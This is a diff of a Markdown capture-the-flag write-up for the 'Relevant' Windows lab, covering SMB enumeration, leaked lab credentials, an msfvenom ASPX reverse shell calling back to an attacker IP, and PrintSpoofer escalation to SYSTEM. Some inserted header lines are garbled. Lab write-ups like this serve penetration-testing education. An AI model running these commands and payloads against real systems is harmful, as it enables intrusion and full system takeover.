@@ -1,7 +1,13 @@
 # **Relevant**
 
-## **1. Reconnaissance**
+all**enge Information
+- **Challenge Name**: Relevant
+- **Category**: Web and SMB Exploitation
+- **Difficulty Level**: Medium
 
+aly**sis
+
+1. **Reconnaissance**:
 The engagement began with a full port scan of the target using Nmap:
 ```bash
 nmap -sC -sV -p- <ip_address>
@@ -13,8 +19,7 @@ The scan revealed:
 * Several other Windows RPC-related ports
 From this, SMB immediately stood out as a primary attack vector.
 
-## **2. Anonymous SMB Enumeration**
-
+2. **Anonymous SMB Enumeration**:
 I attempted to list SMB shares without authentication:
 ```bash
 smbclient -L \\\\<ip_address>\\ -N
@@ -28,8 +33,7 @@ Inside, I found a file named **passwords.txt** and downloaded it:
 get passwords.txt
 ```
 
-## **3. Credential Extraction**
-
+3. **Credential Extraction**:
 Examining `passwords.txt` revealed a base64-encoded string. Decoding it:
 ```bash
 echo "<base64string>" | base64 -d
@@ -38,8 +42,7 @@ This produced two sets of credentials:
 * **Bill** → `Juw4nnaM4n420696969!$$$`
 * **Bob** → `!P@$$W0rD#123`
 
-## **4. Credential Validation**
-
+4. **Credential Validation**:
 I validated the credentials against SMB:
 ```bash
 crackmapexec smb <ip_address> -u Bill -p 'Juw4nnaM4n420696969!$$$'
@@ -49,7 +52,7 @@ crackmapexec smb <ip_address> -u Bob -p '!P@$$W0rD#123'
 * Bill’s credentials were **valid**
 * Bob’s credentials were **invalid**
 
-## **5. Authenticated Share Enumeration**
+5. **Authenticated Share Enumeration**:
 With Bill’s credentials, I enumerated shares:
 ```bash
 crackmapexec smb <ip_address> -u Bill -p 'Juw4nnaM4n420696969!$$$' --shares
@@ -60,8 +63,7 @@ Findings:
 * IPC\$ → Read only
 This confirmed we could upload files to **nt4wrksv**.
 
-## **6. Attempts to Locate Physical Share Mapping (Failed)**
-
+6. **Attempts to Locate Physical Share Mapping (Failed)**:
 To identify where **nt4wrksv** was mapped on the filesystem, I tried:
 ```bash
 enum4linux -S -u Bill -p 'Juw4nnaM4n420696969!$$$' <ip_address>
@@ -69,8 +71,7 @@ smbmap -H <ip_address> -u Bill -p 'Juw4nnaM4n420696969!$$$' -r nt4wrksv
 ```
 Both failed to reveal any useful path mapping information. This meant we didn’t know whether the share was tied to the webserver.
 
-## **7. Remote Execution Attempts (Failed)**
-
+7. **Remote Execution Attempts (Failed)**:
 I attempted various direct remote execution methods with Bill’s credentials:
 * **RDP** with `rdesktop` → Failed due to CredSSP/NLA configuration issues.
 * **RDP** with `xfreerdp` → Certificate mismatch & authentication errors.
@@ -78,8 +79,7 @@ I attempted various direct remote execution methods with Bill’s credentials:
 * **impacket-psexec** → Authenticated only as Guest.
 All these methods failed to provide shell access.
 
-## **8. Discovery of Web-Accessible Uploads (Success)**
-
+8. **Discovery of Web-Accessible Uploads (Success)**:
 While exploring further, I discovered that files uploaded to **nt4wrksv** were accessible via the webserver running on **port 49663**.
 For example, after uploading a `test.txt` file, it was accessible at:
 ```
@@ -87,8 +87,7 @@ http://<ip_address>:49663/nt4wrksv/test.txt
 ```
 This confirmed that **nt4wrksv** was mapped to an IIS-served directory.
 
-## **9. Webshell Upload & Execution (Success)**
-
+9. **Webshell Upload & Execution (Success)**:
 With confirmed web access, I prepared an **ASPX reverse shell** for Netcat:
 ```
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.21.110.209 LPORT=1309 -f aspx > shell.aspx
@@ -107,8 +106,7 @@ http://<ip_address>:49663/nt4wrksv/revshell.aspx
 ```
 A reverse shell connection was established successfully.
 
-## **10. User Flag Retrieval (Success)**
-
+10. **User Flag Retrieval (Success)**:
 From the shell, I navigated to the user’s Desktop directory and retrieved the flag:
 ```cmd
 dir C:\Users
@@ -116,8 +114,7 @@ type C:\Users\Bob\Desktop\user.txt
 ```
 Flag successfully obtained.
 
-## **11. Privilege Escalation Enumeration**
-
+11. **Privilege Escalation Enumeration**:
 Now in the IIS shell, I checked the current user privileges:
 ```cmd
   whoami /priv
@@ -128,8 +125,7 @@ Found `SeImpersonatePrivilege` enabled which is vulnerable to **Token Impersonat
 ```
 Verified that uploaded files were present there.
 
-## **12. Downloading and Uploading PrintSpoofer**
-
+12. **Downloading and Uploading PrintSpoofer**:
 Download a trusted PrintSpoofer binary locally:
 ```bash
   wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe -O PrintSpoofer.exe
@@ -139,8 +135,7 @@ Uploaded it to the writable share:
   smbclient //<ip_address>/nt4wrksv -U 'Bill%Juw4nnaM4n420696969!$$$' -c "put PrintSpoofer.exe"
 ```
 
-## **13. Executing PrintSpoofer to Gain SYSTEM**
-
+13. **Executing PrintSpoofer to Gain SYSTEM**:
 From the IIS shell, I navigated to the uploaded binary location:
 ```cmd
   cd c:\inetpub\wwwroot\nt4wrksv
@@ -151,8 +146,7 @@ Ran PrintSpoofer to spawn a SYSTEM shell:
 ```
 Confirmed elevated privileges using `whoami` which will show `nt authority\system`.
 
-## **14. Retrieving the Administrator Flag**
-
+14. **Retrieving the Administrator Flag**:
 Navigated to the Administrator’s desktop and then retrieve the admin flag:
 ```cmd
   cd C:\Users\Administrator\Desktop
